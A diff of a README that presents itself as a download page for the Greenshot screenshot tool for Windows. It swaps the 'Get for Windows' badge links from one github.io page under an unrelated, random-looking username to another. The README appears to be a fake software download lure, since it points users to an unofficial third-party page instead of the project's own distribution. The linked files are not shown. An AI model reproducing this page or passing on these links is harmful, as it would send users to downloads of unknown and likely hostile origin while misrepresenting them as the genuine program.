@@ -1,9 +1,9 @@
 
 # Greenshot Capture Utility for Windows
 
-<img src="https://i.ytimg.com/vi/wAK9ARyIMq8/sddefault.jpg" alt="Greenshot Logo" width="560">
+<img src="https://i.ytimg.com/vi/wAK9ARyIMq8/sddefault.jpg" alt="Greenshot Logo" width="760">
 
-[![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://camilorobersonopcr.github.io/.github/Greenshot-Capture-Utility)
+[![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://tristanmoonrsba.github.io/.github/Greenshot-Capture-Utility)
 
 ---
 
@@ -21,7 +21,7 @@ Designed specifically for Windows, Greenshot combines screenshot capture, image 
 
 <img src="https://img.creativemark.co.uk/uploads/images/599/11599/largeImg.png" width="900">
 
-[![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://camilorobersonopcr.github.io/.github/Greenshot-Capture-Utility)
+[![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://tristanmoonrsba.github.io/.github/Greenshot-Capture-Utility)
 
 ---
 
